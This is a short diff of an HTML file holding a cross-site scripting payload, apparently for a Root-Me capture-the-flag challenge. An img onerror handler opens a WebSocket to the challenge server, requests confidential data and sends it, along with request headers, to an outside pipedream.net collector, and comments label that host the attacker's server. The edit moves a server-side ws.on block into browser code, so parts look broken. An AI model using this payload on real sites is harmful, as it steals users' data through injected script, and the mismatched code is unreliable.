@@ -9,15 +9,16 @@
 	<img src=x onerror="var ws = new WebSocket('ws://ctf21.root-me.org/ws');
 		ws.onopen = start
 		ws.onmessage = handleReply
+		ws.on('connection', function(ws, req) {
+		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi_head='+req.headers, {mode: 'no-cors'})
+		});
 		function start(event) {
 		  ws.send('hello'); //Send the message to retreive confidential information
 		}
 		function handleReply(event) {
 		  //Exfiltrate the confidential information to attackers server
 		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi='+event.data, {mode: 'no-cors'})
-		ws.on('connection', function(ws, req) {
-		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi_head='+req.headers, {mode: 'no-cors'})
-		});
+		
 	}">
 
 	<script type="text/javascript">
